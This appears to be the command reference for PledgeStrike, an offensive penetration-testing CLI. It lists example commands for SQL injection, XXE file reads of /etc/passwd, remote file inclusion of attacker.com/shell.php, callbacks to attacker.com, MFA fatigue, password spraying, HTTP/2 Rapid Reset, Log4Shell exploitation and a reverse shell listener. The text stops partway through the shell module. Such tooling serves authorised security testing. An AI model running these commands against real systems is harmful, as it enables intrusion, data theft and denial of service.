# PledgeStrike — Command Reference

Complete list of all commands and subcommands for PledgeStrike.

Use `pledgestrike <module> <subcommand> [options]` to run any command.

Run `pledgestrike <module> <subcommand> --help` for detailed flag information.

---

## Web Application Attacks

### `jwt` — JWT Attack Module
| Subcommand | Description |
|------------|-------------|
| `decode` | Decode a JWT token and display header/payload |
| `check` | Vulnerability scan: alg=none, key confusion, JWK, kid injection |
| `crack` | Multi-threaded HS256/HS384/HS512 brute-force |
| `forge` | Create custom JWT tokens with any secret/payload/algorithm |

```
pledgestrike jwt decode --token <JWT>
pledgestrike jwt check --token <JWT>
pledgestrike jwt crack --token <JWT> --wordlist wordlist.txt -j 8
pledgestrike jwt forge --secret s3cr3t --payload '{"role":"admin"}' --alg HS256
```

### `sqli` — SQL Injection
| Subcommand | Description |
|------------|-------------|
| `error` | Error-based SQLi detection |
| `blind` | Boolean-based blind SQLi detection |
| `time` | Time-based blind SQLi detection |
| `dump` | UNION-based data extraction |

```
pledgestrike sqli error --url https://target.com/page --param id
pledgestrike sqli blind --url https://target.com/page --param id
pledgestrike sqli time --url https://target.com/page --param id
pledgestrike sqli dump --url https://target.com/page --param id --table users
```

### `xss` — Cross-Site Scripting
| Subcommand | Description |
|------------|-------------|
| `reflect` | Reflected XSS detection |
| `store` | Stored XSS detection |
| `dom` | DOM-based XSS detection |
| `blind` | Blind XSS with callback |

```
pledgestrike xss reflect --url https://target.com/page --param q
pledgestrike xss store --url https://target.com/comment --param body
pledgestrike xss dom --url https://target.com/page
pledgestrike xss blind --url https://target.com/page --param q --callback-url https://attacker.com/x
```

### `cmdi` — Command Injection
| Subcommand | Description |
|------------|-------------|
| `os` | OS command injection |
| `filter` | Filter bypass attempts |
| `time` | Time-based command injection |
| `oob` | Out-of-band command injection |

```
pledgestrike cmdi os --url https://target.com/ping --param host
pledgestrike cmdi filter --url https://target.com/ping --param host
pledgestrike cmdi time --url https://target.com/ping --param host
pledgestrike cmdi oob --url https://target.com/ping --param host --callback-host attacker.com
```

### `xxe` — XML External Entity
| Subcommand | Description |
|------------|-------------|
| `file` | XXE file read |
| `ssrf` | XXE SSRF |
| `blind` | Blind XXE |
| `oob` | OOB XXE exfiltration |

```
pledgestrike xxe file --url https://target.com/api --file /etc/passwd
pledgestrike xxe ssrf --url https://target.com/api --target-url http://169.254.169.254
pledgestrike xxe blind --url https://target.com/api --callback-host attacker.com
pledgestrike xxe oob --url https://target.com/api --callback-host attacker.com --file /etc/passwd
```

### `lfi` — Local/Remote File Inclusion
| Subcommand | Description |
|------------|-------------|
| `read` | LFI file read with path traversal |
| `include` | RFI test |
| `wrapper` | PHP wrapper exploitation |
| `log` | Log poisoning for LFI to RCE |

```
pledgestrike lfi read --url https://target.com/page --param file --file /etc/passwd
pledgestrike lfi include --url https://target.com/page --param file --remote-url https://attacker.com/shell.php
pledgestrike lfi wrapper --url https://target.com/page --param file
pledgestrike lfi log --url https://target.com/page --param file
```

### `nosqli` — NoSQL Injection
| Subcommand | Description |
|------------|-------------|
| `mongo` | MongoDB injection |
| `redis` | Redis injection |
| `cassandra` | Cassandra injection |
| `blind` | Blind NoSQLi |

```
pledgestrike nosqli mongo --url https://target.com/api --param user
pledgestrike nosqli redis --url https://target.com/api --param key
pledgestrike nosqli cassandra --url https://target.com/api --param id
pledgestrike nosqli blind --url https://target.com/api --param user
```

### `ssti` — Server-Side Template Injection
| Subcommand | Description |
|------------|-------------|
| `detect` | Detect SSTI with multiple template syntaxes |
| `jinja` | Jinja2 exploitation (RCE) |
| `twig` | Twig exploitation (RCE) |
| `freemarker` | FreeMarker exploitation (RCE) |

```
pledgestrike ssti detect --url https://target.com/page --param name
pledgestrike ssti jinja --url https://target.com/page --param name --cmd id
pledgestrike ssti twig --url https://target.com/page --param name --cmd id
pledgestrike ssti freemarker --url https://target.com/page --param name --cmd id
```

### `cors` — CORS Testing
| Subcommand | Description |
|------------|-------------|
| `origin` | Origin reflection test |
| `creds` | Credentials test |
| `wildcard` | Wildcard ACAO test |
| `null` | Null origin test |

```
pledgestrike cors origin --url https://target.com/api
pledgestrike cors creds --url https://target.com/api
pledgestrike cors wildcard --url https://target.com/api
pledgestrike cors null --url https://target.com/api
```

### `crlf` — CRLF Injection
| Subcommand | Description |
|------------|-------------|
| `header` | Header injection |
| `body` | Body injection |
| `split` | Response splitting |
| `log` | Log injection |

```
pledgestrike crlf header --url https://target.com/page --param q
pledgestrike crlf body --url https://target.com/page --param q
pledgestrike crlf split --url https://target.com/page --param q
pledgestrike crlf log --url https://target.com/page --param q
```

### `redirect` — Open Redirect
| Subcommand | Description |
|------------|-------------|
| `scan` | Scan for open redirect params |
| `bypass` | Bypass filter with encoded payloads |
| `chain` | Chain analysis (SSRF/XSS via redirect) |

```
pledgestrike redirect scan --url https://target.com/page
pledgestrike redirect bypass --url https://target.com/page --param next
pledgestrike redirect chain --url https://target.com/page --param next
```

### `cache` — Web Cache Attack
| Subcommand | Description |
|------------|-------------|
| `poison` | Cache poisoning via unkeyed headers |
| `deceive` | Cache deception test |
| `key` | Cache key analysis |

```
pledgestrike cache poison --url https://target.com/page
pledgestrike cache deceive --url https://target.com/page
pledgestrike cache key --url https://target.com/page
```

### `smuggle` — HTTP Request Smuggling
| Subcommand | Description |
|------------|-------------|
| `clte` | CL.TE smuggling |
| `tecl` | TE.CL smuggling |
| `cl0` | CL.0 smuggling |
| `detect` | Auto-detect smuggling type |

```
pledgestrike smuggle clte --url https://target.com
pledgestrike smuggle tecl --url https://target.com
pledgestrike smuggle cl0 --url https://target.com
pledgestrike smuggle detect --url https://target.com
```

### `hpp` — HTTP Parameter Pollution
| Subcommand | Description |
|------------|-------------|
| `detect` | Detect HPP |
| `bypass` | WAF bypass via HPP |
| `auth` | Auth bypass via HPP |
| `logic` | Logic abuse via HPP |

```
pledgestrike hpp detect --url https://target.com/page
pledgestrike hpp bypass --url https://target.com/page
pledgestrike hpp auth --url https://target.com/page
pledgestrike hpp logic --url https://target.com/page
```

### `host` — Host Header Injection
| Subcommand | Description |
|------------|-------------|
| `password` | Password reset poisoning |
| `cache` | Cache poisoning via Host header |
| `access` | Access control bypass |
| `ssrf` | SSRF via Host header |

```
pledgestrike host password --url https://target.com/reset --email victim@example.com
pledgestrike host cache --url https://target.com
pledgestrike host access --url https://target.com
pledgestrike host ssrf --url https://target.com --target internal-service
```

### `csrf` — CSRF Testing
| Subcommand | Description |
|------------|-------------|
| `token` | Token bypass test |
| `samesite` | SameSite bypass test |
| `json` | JSON CSRF test |
| `method` | Method-based CSRF test |

```
pledgestrike csrf token --url https://target.com/form
pledgestrike csrf samesite --url https://target.com/form
pledgestrike csrf json --url https://target.com/api
pledgestrike csrf method --url https://target.com/api
```

### `click` — Clickjacking
| Subcommand | Description |
|------------|-------------|
| `frame` | X-Frame-Options bypass test |
| `overlay` | Overlay attack test |
| `pointer` | Pointer hijacking test |
| `cursor` | Cursor spoofing test |

```
pledgestrike click frame --url https://target.com/page
pledgestrike click overlay --url https://target.com/page
pledgestrike click pointer --url https://target.com/page
pledgestrike click cursor --url https://target.com/page
```

### `idor` — IDOR Testing
| Subcommand | Description |
|------------|-------------|
| `test` | IDOR vulnerability test |
| `enum` | IDOR enumeration |
| `predict` | ID pattern prediction |
| `chain` | Chain IDOR with other attacks |

```
pledgestrike idor test --url https://target.com/api/user/1
pledgestrike idor enum --url https://target.com/api/user/1
pledgestrike idor predict --url https://target.com/api/user/1
pledgestrike idor chain --url https://target.com/api/user/1
```

### `mass` — Mass Assignment
| Subcommand | Description |
|------------|-------------|
| `check` | Mass assignment vulnerability check |
| `inject` | Mass assignment injection |
| `escalate` | Privilege escalation via mass assignment |
| `enum` | Field enumeration |

```
pledgestrike mass check --url https://target.com/api/profile
pledgestrike mass inject --url https://target.com/api/profile
pledgestrike mass escalate --url https://target.com/api/profile
pledgestrike mass enum --url https://target.com/api/profile
```

### `cookie` — Cookie Attack
| Subcommand | Description |
|------------|-------------|
| `fixation` | Session fixation |
| `inject` | Cookie injection |
| `tamper` | Cookie tampering |
| `overflow` | Cookie buffer overflow |

```
pledgestrike cookie fixation --url https://target.com
pledgestrike cookie inject --url https://target.com
pledgestrike cookie tamper --url https://target.com
pledgestrike cookie overflow --url https://target.com
```

### `session` — Session Attack
| Subcommand | Description |
|------------|-------------|
| `fixation` | Session fixation |
| `predict` | Token prediction |
| `hijack` | Session hijacking |
| `puzzle` | Session puzzle |

```
pledgestrike session fixation --url https://target.com
pledgestrike session predict --url https://target.com
pledgestrike session hijack --url https://target.com
pledgestrike session puzzle --url https://target.com
```

### `rce` — Remote Code Execution
| Subcommand | Description |
|------------|-------------|
| `detect` | RCE detection |
| `inject` | RCE injection |
| `chain` | RCE chain attack |
| `oob` | Out-of-band RCE detection |

```
pledgestrike rce detect --url https://target.com/page
pledgestrike rce inject --url https://target.com/page
pledgestrike rce chain --url https://target.com/page
pledgestrike rce oob --url https://target.com/page
```

### `deser` — Deserialization
| Subcommand | Description |
|------------|-------------|
| `detect` | Detect insecure deserialization |
| `java` | Java deserialization exploitation |
| `net` | .NET deserialization exploitation |
| `php` | PHP deserialization exploitation |

```
pledgestrike deser detect --url https://target.com/api
pledgestrike deser java --url https://target.com/api --cmd id
pledgestrike deser net --url https://target.com/api --cmd id
pledgestrike deser php --url https://target.com/api --cmd id
```

### `padoracle` — Padding Oracle
| Subcommand | Description |
|------------|-------------|
| `detect` | Detect padding oracle |
| `decrypt` | Decrypt via padding oracle |
| `encrypt` | Encrypt via padding oracle |
| `bit` | Bit-flipping attack |

```
pledgestrike padoracle detect --url https://target.com/api --param token
pledgestrike padoracle decrypt --url https://target.com/api --param token --ciphertext <CT>
pledgestrike padoracle encrypt --url https://target.com/api --param token --plaintext <PT>
pledgestrike padoracle bit --url https://target.com/api --param token --ciphertext <CT>
```

### `proto` — Prototype Pollution
| Subcommand | Description |
|------------|-------------|
| `scan` | Scan for prototype pollution |
| `gadget` | Gadget chain analysis |
| `exploit` | RCE via prototype pollution gadgets |

```
pledgestrike proto scan --url https://target.com/api
pledgestrike proto gadget --url https://target.com/api
pledgestrike proto exploit --url https://target.com/api --cmd id
```

### `postmsg` — postMessage Abuse
| Subcommand | Description |
|------------|-------------|
| `origin` | Origin bypass test |
| `inject` | postMessage injection |
| `fuzz` | postMessage fuzzing |
| `chain` | Cross-frame chaining |

```
pledgestrike postmsg origin --url https://target.com/page
pledgestrike postmsg inject --url https://target.com/page
pledgestrike postmsg fuzz --url https://target.com/page
pledgestrike postmsg chain --url https://target.com/page
```

### `sw` — Service Worker
| Subcommand | Description |
|------------|-------------|
| `register` | Service worker registration |
| `hijack` | Service worker hijack |
| `persist` | Service worker persistence |
| `fetch` | Fetch interception |

```
pledgestrike sw register --url https://target.com
pledgestrike sw hijack --url https://target.com
pledgestrike sw persist --url https://target.com
pledgestrike sw fetch --url https://target.com
```

### `wasm` — WebAssembly
| Subcommand | Description |
|------------|-------------|
| `analyze` | WASM analysis |
| `memory` | Memory inspection |
| `import` | Import abuse |
| `reverse` | Reverse engineering |

```
pledgestrike wasm analyze --url https://target.com/app.wasm
pledgestrike wasm memory --url https://target.com/app.wasm
pledgestrike wasm import --url https://target.com/app.wasm
pledgestrike wasm reverse --url https://target.com/app.wasm
```

### `unicode` — Unicode/Encoding Attack
| Subcommand | Description |
|------------|-------------|
| `homoglyph` | Homoglyph attack |
| `overlong` | Overlong UTF-8 |
| `bidi` | Bidi (Trojan Source) |
| `normalize` | Normalization attack |

```
pledgestrike unicode homoglyph --url https://target.com/page
pledgestrike unicode overlong --url https://target.com/page
pledgestrike unicode bidi --url https://target.com/page
pledgestrike unicode normalize --url https://target.com/page
```

### `csp` — CSP Bypass
| Subcommand | Description |
|------------|-------------|
| `analyze` | CSP policy analysis |
| `bypass` | CSP bypass testing |
| `inline` | Inline injection test |
| `exfil` | Exfiltration test |

```
pledgestrike csp analyze --url https://target.com
pledgestrike csp bypass --url https://target.com --callback https://attacker.com
pledgestrike csp inline --url https://target.com --callback https://attacker.com
pledgestrike csp exfil --url https://target.com --callback https://attacker.com
```

### `waf` — WAF Detection
| Subcommand | Description |
|------------|-------------|
| `detect` | Detect and fingerprint WAF |

```
pledgestrike waf detect --url https://target.com
```

### `actuator` — Spring Boot Actuator
| Subcommand | Description |
|------------|-------------|
| `env` | Environment dump |
| `heapdump` | Heap dump |
| `jolokia` | Jolokia exploitation |
| `shutdown` | Shutdown endpoint |

```
pledgestrike actuator env --url https://target.com
pledgestrike actuator heapdump --url https://target.com
pledgestrike actuator jolokia --url https://target.com
pledgestrike actuator shutdown --url https://target.com
```

### `debug` — Debug Endpoint Scanner
| Subcommand | Description |
|------------|-------------|
| `scan` | Endpoint scan |
| `trace` | TRACE method test |
| `stack` | Stack trace exposure |
| `source` | Source exposure |

```
pledgestrike debug scan --url https://target.com
pledgestrike debug trace --url https://target.com
pledgestrike debug stack --url https://target.com
pledgestrike debug source --url https://target.com
```

### `openapi` — OpenAPI/Swagger Abuse
| Subcommand | Description |
|------------|-------------|
| `spec` | Spec discovery |
| `fuzz` | Endpoint fuzzer |
| `auth` | Auth bypass |
| `inject` | Parameter injection |

```
pledgestrike openapi spec --url https://target.com/swagger.json
pledgestrike openapi fuzz --url https://target.com
pledgestrike openapi auth --url https://target.com
pledgestrike openapi inject --url https://target.com
```

---

## SSRF & Infrastructure

### `ssrf` — SSRF Probe
| Subcommand | Description |
|------------|-------------|
| `probe` | Inject payloads and monitor callbacks |
| `listen` | Start callback listener only |
| `payloads` | Generate SSRF payloads without sending |

```
pledgestrike ssrf probe --url "http://target.com/fetch?url={SSRF}" --port 8888
pledgestrike ssrf listen --port 8888
pledgestrike ssrf payloads --cloud all --external-ip 1.2.3.4 --smuggle
```

### `ssrf-chain` — SSRF Chain
| Subcommand | Description |
|------------|-------------|
| `metadata` | Cloud metadata extraction |
| `gopher` | Gopher protocol smuggling |
| `blind` | Blind SSRF with callback |
| `scan` | Internal port scan via SSRF |

```
pledgestrike ssrf-chain metadata --url https://target.com/fetch --param url
pledgestrike ssrf-chain gopher --url https://target.com/fetch --param url
pledgestrike ssrf-chain blind --url https://target.com/fetch --param url --callback-host attacker.com
pledgestrike ssrf-chain scan --url https://target.com/fetch --param url --ports common
```

### `cloud` — Cloud Exploitation
| Subcommand | Description |
|------------|-------------|
| `s3` | AWS S3 bucket enumeration and ACL check |
| `iam` | AWS IAM enumeration |
| `lambda` | AWS Lambda function injection test |
| `metadata` | Cloud metadata extraction via SSRF |

```
pledgestrike cloud s3 --bucket target-bucket
pledgestrike cloud iam --token <AWS_TOKEN>
pledgestrike cloud lambda --function-url https://lambda.target.com/
pledgestrike cloud metadata --target-url https://target.com/fetch
```

### `k8s` — Kubernetes Attack
| Subcommand | Description |
|------------|-------------|
| `pods` | Enumerate pods, namespaces, nodes, services |
| `rbac` | Analyze RBAC permissions |
| `secrets` | Extract secrets, service accounts, configmaps |
| `escape` | Test pod escape vectors |

```
pledgestrike k8s pods --api-server https://k8s.target.com:6443 --token <TOKEN>
pledgestrike k8s rbac --api-server https://k8s.target.com:6443 --token <TOKEN>
pledgestrike k8s secrets --api-server https://k8s.target.com:6443 --token <TOKEN>
pledgestrike k8s escape --api-server https://k8s.target.com:6443 --token <TOKEN>
```

### `container` — Container Escape
| Subcommand | Description |
|------------|-------------|
| `docker` | Docker API exploitation |
| `kubelet` | Kubelet exploitation |
| `cap` | Capabilities abuse |
| `mount` | Host mount escape |

```
pledgestrike container docker --url https://target.com:2375
pledgestrike container kubelet --url https://target.com:10250
pledgestrike container cap --url https://target.com
pledgestrike container mount --url https://target.com
```

### `rebind` — DNS Rebinding
| Subcommand | Description |
|------------|-------------|
| `attack` | Simulate DNS rebinding with alternating IPs |
| `listen` | Start DNS listener |
| `bypass` | Test bypass with IP encoding variants |

```
pledgestrike rebind attack --target target.com --interval 5 --count 10
pledgestrike rebind listen --port 53
pledgestrike rebind bypass --target target.com
```

### `takeover` — Subdomain Takeover
| Subcommand | Description |
|------------|-------------|
| `scan` | Scan file of subdomains for takeover |
| `verify` | Verify single subdomain |
| `fingerprint` | Fingerprint subdomain service |

```
pledgestrike takeover scan --domains-file subdomains.txt
pledgestrike takeover verify --domain sub.target.com
pledgestrike takeover fingerprint --domain sub.target.com
```

### `dnsenum` — DNS Enumeration
| Subcommand | Description |
|------------|-------------|
| `axfr` | Zone transfer attempt |
| `records` | DNS records lookup |
| `nsec` | NSEC walking |
| `snoop` | Cache snooping |

```
pledgestrike dnsenum axfr --url target.com
pledgestrike dnsenum records --url target.com
pledgestrike dnsenum nsec --url target.com
pledgestrike dnsenum snoop --url target.com
```

### `subdom` — Subdomain Enumerator
| Subcommand | Description |
|------------|-------------|
| `brute` | Brute force subdomains |
| `ct` | Certificate Transparency logs |
| `passive` | Passive sources |
| `permutate` | Permutation-based discovery |

```
pledgestrike subdom brute --domain target.com --wordlist subdomains.txt
pledgestrike subdom ct --domain target.com
pledgestrike subdom passive --domain target.com
pledgestrike subdom permutate --domain target.com
```

### `tls` — SSL/TLS Auditor
| Subcommand | Description |
|------------|-------------|
| `scan` | Scan single host for TLS vulnerabilities |
| `batch` | Batch scan multiple hosts from file |
| `report` | Generate compliance report |

```
pledgestrike tls scan --host example.com --verbose
pledgestrike tls batch --file hosts.txt --output results.json --workers 10
pledgestrike tls report --input results.json --format markdown --output report.md
```

### `whois` — WHOIS Recon
| Subcommand | Description |
|------------|-------------|
| `lookup` | WHOIS lookup |
| `reverse` | Reverse WHOIS lookup |
| `enum` | Data enumeration |
| `abuse` | Abuse contact extraction |

```
pledgestrike whois lookup --url target.com
pledgestrike whois reverse --url target.com
pledgestrike whois enum --url target.com
pledgestrike whois abuse --url target.com
```

---

## Authentication & Identity

### `oauth` — OAuth Abuse
| Subcommand | Description |
|------------|-------------|
| `redirect` | Redirect URI manipulation |
| `state` | State parameter validation |
| `token` | Token reuse test |
| `scope` | Scope escalation |

```
pledgestrike oauth redirect --auth-url https://target.com/oauth/authorize
pledgestrike oauth state --auth-url https://target.com/oauth/authorize
pledgestrike oauth token --token-url https://target.com/oauth/token --client-id abc123
pledgestrike oauth scope --token-url https://target.com/oauth/token --client-id abc123
```

### `mfa` — MFA Bypass
| Subcommand | Description |
|------------|-------------|
| `fatigue` | MFA fatigue bombing |
| `race` | OTP race attack |
| `otp` | OTP prediction |
| `fallback` | Fallback bypass |

```
pledgestrike mfa fatigue --url https://target.com/mfa --user victim --count 100 --delay 1
pledgestrike mfa race --url https://target.com/mfa --user victim --otp 123456 --count 10
pledgestrike mfa otp --url https://target.com/mfa --user victim --count 10
pledgestrike mfa fallback --url https://target.com/mfa --user victim
```

### `saml` — SAML/SSO Abuse
| Subcommand | Description |
|------------|-------------|
| `xsw` | XML Signature Wrapping |
| `response` | Response manipulation |
| `cert` | Certificate confusion |
| `assertion` | Assertion forgery |

```
pledgestrike saml xsw --url https://target.com/saml/acs
pledgestrike saml response --url https://target.com/saml/acs
pledgestrike saml cert --url https://target.com/saml/metadata
pledgestrike saml assertion --url https://target.com/saml/acs
```

### `webauthn` — WebAuthn/FIDO2
| Subcommand | Description |
|------------|-------------|
| `origin` | Origin confusion test |
| `resident` | Resident key test |
| `relay` | Relay attack |
| `downgrade` | Downgrade attack |

```
pledgestrike webauthn origin --url https://target.com/auth
pledgestrike webauthn resident --url https://target.com/auth
pledgestrike webauthn relay --url https://target.com/auth
pledgestrike webauthn downgrade --url https://target.com/auth
```

### `kerb` — Kerberos Attack
| Subcommand | Description |
|------------|-------------|
| `roast` | Kerberoasting |
| `asrep` | AS-REP roasting |
| `diamond` | Diamond ticket |
| `s4u` | S4U abuse |

```
pledgestrike kerb roast --url https://dc.target.com
pledgestrike kerb asrep --url https://dc.target.com
pledgestrike kerb diamond --url https://dc.target.com
pledgestrike kerb s4u --url https://dc.target.com
```

### `ntlm` — NTLM Attack
| Subcommand | Description |
|------------|-------------|
| `relay` | NTLM relay |
| `pass` | Pass-the-hash |
| `brute` | NTLM brute force |
| `enum` | Info enumeration |

```
pledgestrike ntlm relay --url https://target.com
pledgestrike ntlm pass --url https://target.com
pledgestrike ntlm brute --url https://target.com
pledgestrike ntlm enum --url https://target.com
```

### `spray` — Password Sprayer
| Subcommand | Description |
|------------|-------------|
| `spray` | Spray single password against user list |
| `lockout` | Test lockout policy |
| `policy` | Detect password policy |
| `round` | Round-robin spraying |

```
pledgestrike spray spray --url https://target.com/login --users-file users.txt --password Winter2024
pledgestrike spray lockout --url https://target.com/login --user victim --count 10
pledgestrike spray policy --url https://target.com/login
pledgestrike spray round --url https://target.com/login --users-file users.txt --delay 5
```

### `brute` — Brute Forcer
| Subcommand | Description |
|------------|-------------|
| `http` | HTTP Basic Auth brute force |
| `ssh` | SSH brute force |
| `ftp` | FTP brute force |
| `form` | HTTP form-based brute force |

```
pledgestrike brute http --url https://target.com --users-file users.txt --pass-file pass.txt --workers 4
pledgestrike brute ssh --host target.com --port 22 --users-file users.txt --pass-file pass.txt
pledgestrike brute ftp --host target.com --port 21 --users-file users.txt --pass-file pass.txt
pledgestrike brute form --url https://target.com/login --users-file users.txt --pass-file pass.txt --user-field username --pass-field password --fail-text invalid
```

---

## API & Protocol Testing

### `api` — API Endpoint Enumerator
| Subcommand | Description |
|------------|-------------|
| `enum` | REST API endpoint discovery + method fuzzing |
| `fuzz` | Query parameter fuzzing |
| `graphql` | GraphQL discovery and introspection |
| `auth` | Authentication bypass testing |

```
pledgestrike api enum --url https://api.target.com --wordlist endpoints.txt --methods GET,POST,PUT,DELETE
pledgestrike api fuzz --url https://api.target.com/users --wordlist params.txt
pledgestrike api graphql --url https://api.target.com/graphql --suggest
pledgestrike api auth --url https://api.target.com/users/1 --idor --no-auth
```

### `graphql-attack` — GraphQL Attack
| Subcommand | Description |
|------------|-------------|
| `introspect` | Introspection query — dump schema |
| `batch` | Batch query DoS |
| `suggest` | Field suggestion attack |
| `depth` | Query depth limit bypass |

```
pledgestrike graphql-attack introspect --url https://target.com/graphql
pledgestrike graphql-attack batch --url https://target.com/graphql --count 50
pledgestrike graphql-attack suggest --url https://target.com/graphql --wordlist fields.txt
pledgestrike graphql-attack depth --url https://target.com/graphql --max-depth 20
```

### `ws` — WebSocket Tester
| Subcommand | Description |
|------------|-------------|
| `fuzz` | WebSocket fuzzing |
| `inject` | WebSocket injection |
| `cswssh` | Cross-site WebSocket hijacking |
| `auth` | WebSocket auth bypass |

```
pledgestrike ws fuzz --url wss://target.com/ws --message ps_ws_fuzz
pledgestrike ws inject --url wss://target.com/ws --payload '{"cmd":"id"}'
pledgestrike ws cswssh --url wss://target.com/ws
pledgestrike ws auth --url wss://target.com/ws
```

### `grpc` — gRPC Attack
| Subcommand | Description |
|------------|-------------|
| `reflect` | Reflection service discovery |
| `method` | Method enumeration |
| `meta` | Metadata injection |
| `stream` | Stream abuse |

```
pledgestrike grpc reflect --url https://target.com:9090
pledgestrike grpc method --url https://target.com:9090
pledgestrike grpc meta --url https://target.com:9090
pledgestrike grpc stream --url https://target.com:9090 --count 100
```

### `h2` — HTTP/2 Attack
| Subcommand | Description |
|------------|-------------|
| `rapidreset` | Rapid Reset attack |
| `stream` | Stream abuse |
| `header` | HPACK header injection |
| `priority` | Priority manipulation |

```
pledgestrike h2 rapidreset --url https://target.com --count 1000 --rate 100
pledgestrike h2 stream --url https://target.com --count 100
pledgestrike h2 header --url https://target.com
pledgestrike h2 priority --url https://target.com
```

### `sse` — Server-Sent Events Abuse
| Subcommand | Description |
|------------|-------------|
| `inject` | SSE injection |
| `exhaust` | Connection exhaustion |
| `exfil` | Data exfiltration via SSE |
| `replay` | SSE replay attack |

```
pledgestrike sse inject --url https://target.com/events
pledgestrike sse exhaust --url https://target.com/events --count 100
pledgestrike sse exfil --url https://target.com/events
pledgestrike sse replay --url https://target.com/events
```

### `webdav` — WebDAV Exploitation
| Subcommand | Description |
|------------|-------------|
| `methods` | Method enumeration |
| `propfind` | PROPFIND directory listing |
| `upload` | File upload test |
| `copy` | COPY/MOVE abuse |

```
pledgestrike webdav methods --url https://target.com/webdav
pledgestrike webdav propfind --url https://target.com/webdav
pledgestrike webdav upload --url https://target.com/webdav
pledgestrike webdav copy --url https://target.com/webdav
```

### `wsdl` — WSDL/SOAP Exploitation
| Subcommand | Description |
|------------|-------------|
| `parse` | WSDL parser |
| `inject` | SOAP injection |
| `xxe` | XXE via SOAP |
| `fuzz` | Service fuzzer |

```
pledgestrike wsdl parse --url https://target.com/service?wsdl
pledgestrike wsdl inject --url https://target.com/service
pledgestrike wsdl xxe --url https://target.com/service
pledgestrike wsdl fuzz --url https://target.com/service
```

### `webrtc` — WebRTC Exploiter
| Subcommand | Description |
|------------|-------------|
| `leak` | IP leak detection |
| `stun` | STUN/TURN abuse |
| `relay` | Relay attack |
| `fingerprint` | Fingerprinting |

```
pledgestrike webrtc leak --url https://target.com
pledgestrike webrtc stun --url https://target.com
pledgestrike webrtc relay --url https://target.com
pledgestrike webrtc fingerprint --url https://target.com
```

---

## CI/CD & Supply Chain

### `cicd` — CI/CD Attack
| Subcommand | Description |
|------------|-------------|
| `inject` | Pipeline injection |
| `poison` | Artifact poisoning |
| `runner` | Runner takeover |
| `webhook` | Webhook exploitation |

```
pledgestrike cicd inject --url https://target.com/ci
pledgestrike cicd poison --url https://target.com/registry
pledgestrike cicd runner --url https://target.com/runner
pledgestrike cicd webhook --url https://target.com/webhook
```

### `supply` — Supply Chain Tester
| Subcommand | Description |
|------------|-------------|
| `typosquat` | Typosquatting detection |
| `confusion` | Dependency confusion |
| `poison` | Package poisoning |
| `audit` | Dependency audit |

```
pledgestrike supply typosquat --url https://registry.npmjs.org
pledgestrike supply confusion --url https://target.com
pledgestrike supply poison --url https://target.com
pledgestrike supply audit --url https://target.com
```

### `git` — Git Exposure & Repo Attack
| Subcommand | Description |
|------------|-------------|
| `expose` | .git directory exposure |
| `dump` | .git dump |
| `hook` | Git hook injection |
| `actions` | GitHub Actions exploitation |

```
pledgestrike git expose --url https://target.com/.git/
pledgestrike git dump --url https://target.com/.git/
pledgestrike git hook --url https://target.com/repo
pledgestrike git actions --url https://github.com/target/repo
```

### `secret` — Secret Hunter
| Subcommand | Description |
|------------|-------------|
| `js` | JS bundle secret extraction |
| `repo` | Repository secret scanning |
| `response` | API response secret scanning |
| `docker` | Docker layer secret scanning |

```
pledgestrike secret js --url https://target.com/app.js
pledgestrike secret repo --url https://github.com/target/repo --token <GITHUB_TOKEN>
pledgestrike secret response --url https://target.com/api/users --token <TOKEN>
pledgestrike secret docker --url https://target.com/image:latest --token <TOKEN>
```

---

## Race Conditions & Concurrency

### `race` — Race Condition
| Subcommand | Description |
|------------|-------------|
| `race` | Generic race condition |
| `toctou` | Time-of-check vs time-of-use |
| `balance` | Double-spend (concurrent transfers) |
| `coupon` | Coupon abuse (concurrent apply) |

```
pledgestrike race race --url https://target.com/api --method POST --body '{"action":"apply"}' --workers 10 --count 100
pledgestrike race toctou --url https://target.com/api
pledgestrike race balance --url https://target.com/api/transfer --account 12345 --workers 10
pledgestrike race coupon --url https://target.com/api/coupon --coupon SAVE50 --workers 10
```

### `ratelimit` — Rate Limit Tester
| Subcommand | Description |
|------------|-------------|
| `burst` | Burst requests to single endpoint |
| `distributed` | Distributed rate limit testing |
| `report` | Test multiple endpoints for missing rate limits |

```
pledgestrike ratelimit burst --url https://target.com/api --count 100 --workers 10
pledgestrike ratelimit distributed --url https://target.com/api --count 50 --sources 5
pledgestrike ratelimit report --url https://target.com/api --endpoints /login,/register,/reset --count 50
```

---

## Payload & Exploit Tools

### `payload` — Payload Generator
| Subcommand | Description |
|------------|-------------|
| `xss` | Generate XSS payloads with encoding |
| `sqli` | Generate SQLi payloads with encoding |
| `cmdi` | Generate command injection payloads |
| `encode` | Encode payload with various schemes |

```
pledgestrike payload xss --context html
pledgestrike payload sqli --context union
pledgestrike payload cmdi --context linux
pledgestrike payload encode --input "alert(1)" --encoding all
```

### `wfuzz` — Web Fuzzer
| Subcommand | Description |
|------------|-------------|
| `param` | Fuzz URL parameters with diff analysis |
| `header` | Fuzz HTTP headers with diff analysis |
| `body` | Fuzz POST body parameters |
| `cookie` | Fuzz cookies with diff analysis |

```
pledgestrike wfuzz param --url https://target.com/page --wordlist params.txt
pledgestrike wfuzz header --url https://target.com --wordlist headers.txt
pledgestrike wfuzz body --url https://target.com/api --wordlist body_params.txt
pledgestrike wfuzz cookie --url https://target.com --wordlist cookies.txt
```

### `exploit` — Exploit Runner
| Subcommand | Description |
|------------|-------------|
| `search` | Search local exploit database |
| `lookup` | Look up single CVE |
| `recent` | List recent CVEs by date range |
| `run` | Run exploit against target |
| `verify` | Verify if target is vulnerable |
| `chain` | Chain multiple exploits |

```
pledgestrike exploit search --query "log4j"
pledgestrike exploit lookup --cve CVE-2021-44228
pledgestrike exploit recent --start 2024-01-01 --end 2024-06-01 --severity HIGH
pledgestrike exploit run --cve CVE-2021-44228 --target https://target.com
pledgestrike exploit verify --cve CVE-2021-44228 --target https://target.com
pledgestrike exploit chain --cves "CVE-2021-44228,CVE-2022-22965" --target https://target.com
```

### `ioc` — IOC Extractor
| Subcommand | Description |
|------------|-------------|
| `extract` | Extract IOCs from log file |
| `hunt` | Search for specific IOC patterns |
| `stats` | Extract IOCs and show statistics |

```
pledgestrike ioc extract --file /var/log/auth.log --types all --format json
pledgestrike ioc hunt --file /var/log/auth.log --pattern 192.168.1.1 --context 3
pledgestrike ioc stats --file /var/log/auth.log --min 5
```

### `shell` — Reverse Shell Manager
| Subcommand | Description |
|------------|-------------|
| `listen` | Listen for incoming reverse shells |
| `generate` | Generate reverse shell one-liners |

```
pledgestrike shell listen --port 4444 --bind 0.0.0.0 --encrypt
